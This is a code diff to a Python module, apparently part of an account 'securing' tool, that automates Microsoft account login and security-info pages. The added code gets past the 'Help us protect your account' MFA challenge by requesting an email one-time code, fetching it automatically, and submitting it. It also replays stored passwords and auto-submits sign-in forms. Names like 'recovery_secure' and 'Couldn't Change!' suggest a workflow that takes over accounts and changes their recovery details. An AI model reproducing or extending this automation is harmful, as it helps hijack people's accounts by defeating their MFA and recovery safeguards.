@@ -5,8 +5,13 @@ from urllib.parse import urljoin, unquote
 
 import httpx
 
+from securing.utils.cookies.get_email_code import get_email_code
+
 _PROOFS_URL = "https://account.live.com/proofs/Manage/additional"
 _MAX_BRIDGE_HOPS = 10
+
+# PageIDs where type=28 KMSI is valid. Never use KMSI on MFA (i5600) or login (i5030).
+_KMSI_PAGE_IDS = frozenset({"i5245", "i5643"})
 
 
 def _title(text: str) -> str:
@@ -14,6 +19,11 @@ def _title(text: str) -> str:
     if not m:
         return "(no title)"
     return re.sub(r"\s+", " ", m.group(1)).strip()[:120]
+
+
+def _page_id(text: str) -> str | None:
+    m = re.search(r'PageID" content="([^"]+)"', text)
+    return m.group(1) if m else None
 
 
 def _find_t0(text: str) -> re.Match | None:
@@ -45,11 +55,12 @@ def _page_debug(text: str, *, url: str = "", status: int | None = None) -> str:
         flags.append("urlPost")
     if '"sft"' in lower or "sfttag" in lower:
         flags.append("sFT")
+    if "arruserproofs" in lower:
+        flags.append("arrUserProofs")
     action = re.search(r'action="([^"]+)"', text, re.I)
-    page_id = re.search(r'PageID" content="([^"]+)"', text)
     return (
         f"status={status} url={url!s} title={_title(text)!r} "
-        f"pageId={(page_id.group(1) if page_id else None)!r} "
+        f"pageId={_page_id(text)!r} "
         f"flags={flags} action={(action.group(1)[:180] if action else None)!r} "
         f"len={len(text)} snippet={text[:500]!r}"
     )
@@ -74,7 +85,6 @@ def _meta_refresh_url(text: str) -> str | None:
         url = html.unescape(m.group(1).replace("&amp;", "&"))
         if "jsdisabled.srf" in url.lower():
             continue
-        # Prefer refreshes outside <noscript> — skip if this match sits in noscript
         start = m.start()
         noscript_open = text.rfind("<noscript", 0, start)
         noscript_close = text.rfind("</noscript>", 0, start)
@@ -160,6 +170,58 @@ def _wreply_from_url(url: str) -> str | None:
     return unquote(m.group(1))
 
 
+def _page_fingerprint(text: str, url: str) -> str:
+    return f"{_page_id(text) or '?'}|{_title(text)}|{url.split('&ct=')[0][:180]}"
+
+
+def _extract_email_otc_proof(text: str) -> dict[str, str] | None:
+    """Pull the first email OTC proof from arrUserProofs on MFA pages (i5600)."""
+    m = re.search(r'"arrUserProofs"\s*:\s*(\[.*?\])\s*,\s*"', text, re.DOTALL)
+    if not m:
+        # Fallback: looser match
+        m = re.search(r'"arrUserProofs"\s*:\s*(\[.*?\])', text, re.DOTALL)
+    if not m:
+        return None
+    blob = m.group(1)
+    # Prefer email proofs (type 1) with otcEnabled
+    for proof_m in re.finditer(
+        r'\{[^{}]*?"type"\s*:\s*1[^{}]*?\}',
+        blob,
+        re.DOTALL,
+    ):
+        chunk = proof_m.group(0)
+        if '"otcEnabled":true' not in chunk and '"otcEnabled": true' not in chunk:
+            continue
+        data_m = re.search(r'"data"\s*:\s*"((?:\\.|[^"\\])*)"', chunk)
+        display_m = re.search(r'"display"\s*:\s*"((?:\\.|[^"\\])*)"', chunk)
+        if not data_m:
+            continue
+        return {
+            "data": data_m.group(1),
+            "display": display_m.group(1) if display_m else "",
+        }
+    # Any otcEnabled proof
+    data_m = re.search(
+        r'"otcEnabled"\s*:\s*true[^{}]*?"data"\s*:\s*"((?:\\.|[^"\\])*)"'
+        r'|"data"\s*:\s*"((?:\\.|[^"\\])*)"[^{}]*?"otcEnabled"\s*:\s*true',
+        blob,
+        re.DOTALL,
+    )
+    if data_m:
+        return {"data": data_m.group(1) or data_m.group(2), "display": ""}
+    return None
+
+
+def _clean_password(password: str | None) -> str | None:
+    if not password:
+        return None
+    # Strip UNVERIFIED annotations from recovery_secure
+    cleaned = re.sub(r"\s*\(UNVERIFIED[^)]*\)\s*$", "", password).strip()
+    if not cleaned or cleaned == "Couldn't Change!":
+        return None
+    return cleaned
+
+
 async def _get(session: httpx.AsyncClient, url: str) -> httpx.Response:
     return await session.get(url, follow_redirects=True)
 
@@ -177,19 +239,280 @@ async def _post_form(
     )
 
 
+async def _send_i5600_otc(
+    session: httpx.AsyncClient,
+    *,
+    login: str,
+    sft: str,
+    sent_proof: str,
+    security_email: str,
+) -> bool:
+    """Request MFA email OTC via GetOneTimeCode (type=18 alone often sends nothing)."""
+    purposes = (
+        "eOTT_PrivProofConfirm",
+        "eOTT_OtcLogin",
+        "eOTT_ConfirmEmail",
+        "eOTT_AddProof",
+    )
+    for purpose in purposes:
+        payload = {
+            "login": login,
+            "flowtoken": sft,
+            "purpose": purpose,
+            "channel": "Email",
+            "ChallengeViewSupported": "1",
+            "AltEmailE": sent_proof,
+            "lcid": "1033",
+            "ProofConfirmation": security_email,
+        }
+        try:
+            resp = await session.post(
+                url="https://login.live.com/GetOneTimeCode.srf?id=38936",
+                headers={
+                    "Accept": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                data=payload,
+            )
+        except Exception:
+            logging.exception("security_information: GetOneTimeCode %s failed", purpose)
+            continue
+
+        body = resp.text or ""
+        logging.info(
+            "security_information: GetOneTimeCode purpose=%s status=%s body=%r",
+            purpose,
+            resp.status_code,
+            body[:400],
+        )
+        if resp.status_code != 200 or not body.strip():
+            continue
+        try:
+            data = resp.json()
+        except Exception:
+            # Non-JSON 200 — treat as sent if not an obvious HTML error page
+            if "sErrTxt" not in body and "<html" not in body.lower():
+                return True
+            continue
+        if not isinstance(data, dict):
+            continue
+        # MS returns various shapes; hard fail only on explicit error codes
+        err = data.get("error") or data.get("ErrorCode") or data.get("errorCode")
+        if err not in (None, "", 0, "0"):
+            logging.warning(
+                "security_information: GetOneTimeCode purpose=%s error=%s",
+                purpose,
+                err,
+            )
+            continue
+        return True
+    return False
+
+
+async def _complete_i5600_email_otc(
+    session: httpx.AsyncClient,
+    text: str,
+    *,
+    security_email: str,
+    account_email: str | None,
+) -> httpx.Response | None:
+    """Finish 'Help us protect your account' (i5600) via security-email OTC."""
+    url_post, sft = _extract_url_post_sft(text)
+    proof = _extract_email_otc_proof(text)
+    if not url_post or not sft or not proof:
+        logging.warning(
+            "security_information: i5600 missing urlPost/sFT/proof "
+            "(urlPost=%s sFT=%s proof=%s)",
+            bool(url_post),
+            bool(sft),
+            bool(proof),
+        )
+        return None
+
+    login = (account_email or "").strip()
+    sent_proof = proof["data"]
+    logging.info(
+        "security_information: i5600 email OTC challenge display=%s — sending code",
+        proof.get("display") or "(unknown)",
+    )
+    print("[~] - Proofs MFA (Help us protect) — sending security-email OTP…")
+
+    sent = await _send_i5600_otc(
+        session,
+        login=login,
+        sft=sft,
+        sent_proof=sent_proof,
+        security_email=security_email,
+    )
+
+    # Fallback: classic type=18 form post (some tenants still use it)
+    if not sent:
+        logging.warning("security_information: GetOneTimeCode inconclusive — trying type=18")
+        send_resp = await session.post(
+            url=url_post,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            data={
+                "login": login,
+                "loginfmt": login,
+                "SentProofIDE": sent_proof,
+                "PPFT": sft,
+                "type": "18",
+                "GeneralVerify": "false",
+                "canary": "",
+                "sacxt": "1",
+                "hpgrequestid": "",
+                "hideSmsInMfaProofs": "false",
+                "AddTD": "true",
+                "ProofConfirmation": security_email,
+            },
+            follow_redirects=True,
+        )
+        send_text = send_resp.text or ""
+        logging.info(
+            "security_information: type=18 → %s",
+            _page_debug(send_text, url=str(send_resp.url), status=send_resp.status_code),
+        )
+        url_post2, sft2 = _extract_url_post_sft(send_text)
+        if url_post2:
+            url_post = url_post2
+        if sft2:
+            sft = sft2
+        proof2 = _extract_email_otc_proof(send_text)
+        if proof2:
+            sent_proof = proof2["data"]
+
+    code = await get_email_code(security_email, timeout=120)
+    if not code:
+        logging.error(
+            "security_information: no OTP arrived for %s during i5600 challenge",
+            security_email,
+        )
+        print("[X] - No security-email OTP for proofs MFA")
+        return None
+
+    print(f"[+] - Got proofs MFA OTP ({code})")
+    logging.info("security_information: submitting i5600 OTC")
+
+    # type=19 verifies OTC (same as authenticator path); also try type=27
+    last = None
+    for otc_type in ("19", "27"):
+        payload = {
+            "login": login,
+            "loginfmt": login,
+            "otc": code,
+            "SentProofIDE": sent_proof,
+            "PPFT": sft,
+            "type": otc_type,
+            "GeneralVerify": "false",
+            "AddTD": "true",
+            "canary": "",
+            "sacxt": "1",
+            "hpgrequestid": "",
+            "hideSmsInMfaProofs": "false",
+            "infoPageShown": "1",
+            "ProofConfirmation": security_email,
+        }
+        last = await session.post(
+            url=url_post,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            data=payload,
+            follow_redirects=True,
+        )
+        logging.info(
+            "security_information: i5600 OTC type=%s → %s",
+            otc_type,
+            _page_debug(last.text, url=str(last.url), status=last.status_code),
+        )
+        if _find_t0(last.text):
+            return last
+        pid = _page_id(last.text)
+        # Left MFA page — success path (SSO form, KMSI, or proofs)
+        if pid not in ("i5600", "i5030"):
+            return last
+        # Still on MFA with error — try next type
+        if '"sErrTxt"' in last.text and re.search(
+            r'"sErrTxt"\s*:\s*"[^"]+', last.text
+        ):
+            err = re.search(r'"sErrTxt"\s*:\s*"((?:\\.|[^"])*)"', last.text)
+            if err and err.group(1).strip():
+                logging.warning(
+                    "security_information: i5600 OTC type=%s error=%s",
+                    otc_type,
+                    err.group(1)[:160],
+                )
+                # Refresh PPFT for next attempt
+                _, sft3 = _extract_url_post_sft(last.text)
+                if sft3:
+                    sft = sft3
+                continue
+        return last
+    return last
+
+
+async def _try_password_on_login_page(
+    session: httpx.AsyncClient,
+    text: str,
+    *,
+    account_email: str,
+    password: str,
+) -> httpx.Response | None:
+    """If proofs SSO bounced to i5030 login, try password once."""
+    from securing.utils.login_pwd import login_pwd
+
+    url_post, sft = _extract_url_post_sft(text)
+    if not url_post or not sft:
+        return None
+    logging.info("security_information: i5030 — attempting password re-auth")
+    print("[~] - Proofs bounced to login — retrying with password…")
+    try:
+        page = await login_pwd(session, account_email, url_post, password, sft)
+    except Exception:
+        logging.exception("security_information: password re-auth failed")
+        return None
+    # May land on KMSI / SSO / proofs
+    url_post2, sft2 = _extract_url_post_sft(page)
+    pid = _page_id(page)
+    if pid in _KMSI_PAGE_IDS and url_post2 and sft2:
+        resp = await session.post(
+            url=url_post2,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            data=f"PPFT={sft2}&canary=&LoginOptions=3&type=28&hpgrequestid=&ctx=",
+            follow_redirects=True,
+        )
+        return resp
+    # Wrap as a fake response-like object via a simple namespace
+    class _R:
+        def __init__(self, body: str):
+            self.text = body
+            self.url = "https://login.live.com/login.srf"
+            self.status_code = 200
+
+    return _R(page)
+
+
 async def _bridge_to_proofs(
     session: httpx.AsyncClient,
     text: str,
     url: str,
     status: int | None,
+    *,
+    security_email: str | None = None,
+    account_email: str | None = None,
+    password: str | None = None,
 ) -> tuple[str, str, int | None]:
-    """Follow Object-moved / forms / SSO / KMSI until t0 or give up.
+    """Follow Object-moved / forms / SSO / KMSI / MFA-OTC until t0 or give up.
 
     Never follows noscript jsDisabled.srf — that is a JS-required dead end.
+    Never loops type=28 KMSI on MFA (i5600) or login (i5030) pages.
     """
     current = text
     current_url = url
     current_status = status
+    seen: dict[str, int] = {}
+    kmsi_attempts = 0
+    otc_attempted = False
+    password_attempted = False
+    password = _clean_password(password)
 
     for hop in range(_MAX_BRIDGE_HOPS):
         if _find_t0(current):
@@ -200,7 +523,16 @@ async def _bridge_to_proofs(
             )
             return current, current_url, current_status
 
-        # Already on the useless jsDisabled page — bounce back to proofs / wreply
+        fp = _page_fingerprint(current, current_url)
+        seen[fp] = seen.get(fp, 0) + 1
+        if seen[fp] >= 3:
+            logging.warning(
+                "security_information: same page repeated %s times — stopping bridge (%s)",
+                seen[fp],
+                _page_debug(current, url=current_url, status=current_status),
+            )
+            break
+
         if "jsdisabled.srf" in current_url.lower():
             wreply = _wreply_from_url(current_url)
             target = wreply or _PROOFS_URL
@@ -226,7 +558,6 @@ async def _bridge_to_proofs(
             current, current_url, current_status = resp.text, str(resp.url), resp.status_code
             continue
 
-        # Prefer real forms over meta-refresh (noscript refresh points at jsDisabled)
         sso, missing = _sso_fields(current)
         if sso:
             logging.info(
@@ -258,7 +589,7 @@ async def _bridge_to_proofs(
             current, current_url, current_status = resp.text, str(resp.url), resp.status_code
             continue
 
-        if action and ("fmHF" in current or fields) and fields:
+        if action and ("fmHF" in current or fields) and fields and "pprid" in fields:
             logging.info(
                 "security_information: auto-submitting form action=%s fields=%s",
                 action[:240],
@@ -268,11 +599,93 @@ async def _bridge_to_proofs(
             current, current_url, current_status = resp.text, str(resp.url), resp.status_code
             continue
 
-        # Already-authenticated SSO: KMSI / type=28 finish using ServerData tokens
+        pid = _page_id(current)
+
+        # i5600 = "Help us protect" MFA — needs email OTC, NOT type=28 KMSI
+        if pid == "i5600" or (
+            "help us protect" in current.lower() and "arrUserProofs" in current
+        ):
+            if otc_attempted:
+                logging.warning(
+                    "security_information: i5600 OTC already attempted — stopping"
+                )
+                break
+            if not security_email or security_email == "Couldn't Change!":
+                logging.warning(
+                    "security_information: i5600 MFA but no security_email available"
+                )
+                break
+            otc_attempted = True
+            resp = await _complete_i5600_email_otc(
+                session,
+                current,
+                security_email=security_email,
+                account_email=account_email,
+            )
+            if resp is None:
+                break
+            current, current_url, current_status = (
+                resp.text,
+                str(getattr(resp, "url", current_url)),
+                getattr(resp, "status_code", current_status),
+            )
+            # After OTC, pull wreply/proofs if still not on t0
+            if not _find_t0(current):
+                wreply = _wreply_from_url(url) or _wreply_from_url(current_url)
+                resp2 = await _get(session, wreply or _PROOFS_URL)
+                current, current_url, current_status = (
+                    resp2.text,
+                    str(resp2.url),
+                    resp2.status_code,
+                )
+            continue
+
+        # i5030 / generic login — password once, never KMSI-loop
+        if pid in ("i5030", "i5026") or (
+            "sign in to your microsoft account" in current.lower()
+            and "arrUserProofs" not in current
+            and pid not in _KMSI_PAGE_IDS
+        ):
+            if (
+                not password_attempted
+                and password
+                and account_email
+                and "@" in account_email
+            ):
+                password_attempted = True
+                resp = await _try_password_on_login_page(
+                    session,
+                    current,
+                    account_email=account_email,
+                    password=password,
+                )
+                if resp is not None:
+                    current = resp.text
+                    current_url = str(getattr(resp, "url", current_url))
+                    current_status = getattr(resp, "status_code", current_status)
+                    if not _find_t0(current):
+                        wreply = _wreply_from_url(url) or _wreply_from_url(current_url)
+                        resp2 = await _get(session, wreply or _PROOFS_URL)
+                        current, current_url, current_status = (
+                            resp2.text,
+                            str(resp2.url),
+                            resp2.status_code,
+                        )
+                    continue
+            logging.warning(
+                "security_information: stuck on login page %s — session too weak for proofs",
+                pid,
+            )
+            break
+
+        # Real KMSI page only (i5245 etc.)
         url_post, sft = _extract_url_post_sft(current)
-        if url_post and sft:
+        if url_post and sft and pid in _KMSI_PAGE_IDS and kmsi_attempts < 2:
+            kmsi_attempts += 1
             logging.info(
-                "security_information: KMSI finish via urlPost (help-protect / login.srf)"
+                "security_information: KMSI finish via urlPost (pageId=%s attempt=%s)",
+                pid,
+                kmsi_attempts,
             )
             resp = await session.post(
                 url=url_post,
@@ -282,7 +695,6 @@ async def _bridge_to_proofs(
             )
             current, current_url, current_status = resp.text, str(resp.url), resp.status_code
             if not _find_t0(current):
-                # Finish often returns to login — pull wreply / proofs next
                 wreply = _wreply_from_url(url) or _wreply_from_url(current_url)
                 resp2 = await _get(session, wreply or _PROOFS_URL)
                 current, current_url, current_status = (
@@ -291,6 +703,12 @@ async def _bridge_to_proofs(
                     resp2.status_code,
                 )
             continue
+
+        if url_post and sft and pid not in _KMSI_PAGE_IDS:
+            logging.info(
+                "security_information: skipping type=28 on non-KMSI pageId=%s",
+                pid,
+            )
 
         refresh = _meta_refresh_url(current)
         if refresh:
@@ -310,7 +728,13 @@ async def _bridge_to_proofs(
     return current, current_url, current_status
 
 
-async def security_information(session: httpx.AsyncClient):
+async def security_information(
+    session: httpx.AsyncClient,
+    *,
+    security_email: str | None = None,
+    account_email: str | None = None,
+    password: str | None = None,
+):
     sec_info = await session.get(url=_PROOFS_URL, follow_redirects=True)
     logging.info(
         "security_information: initial proofs GET — %s",
@@ -320,10 +744,17 @@ async def security_information(session: httpx.AsyncClient):
     text = sec_info.text
     url = str(sec_info.url)
     status = sec_info.status_code
+    bridge_kwargs = dict(
+        security_email=security_email,
+        account_email=account_email,
+        password=password,
+    )
 
     match = _find_t0(text)
     if not match:
-        text, url, status = await _bridge_to_proofs(session, text, url, status)
+        text, url, status = await _bridge_to_proofs(
+            session, text, url, status, **bridge_kwargs
+        )
         match = _find_t0(text)
 
     if not match:
@@ -335,7 +766,9 @@ async def security_information(session: httpx.AsyncClient):
         )
         text, url, status = retry.text, str(retry.url), retry.status_code
         if not _find_t0(text):
-            text, url, status = await _bridge_to_proofs(session, text, url, status)
+            text, url, status = await _bridge_to_proofs(
+                session, text, url, status, **bridge_kwargs
+            )
         match = _find_t0(text)
 
     if not match:
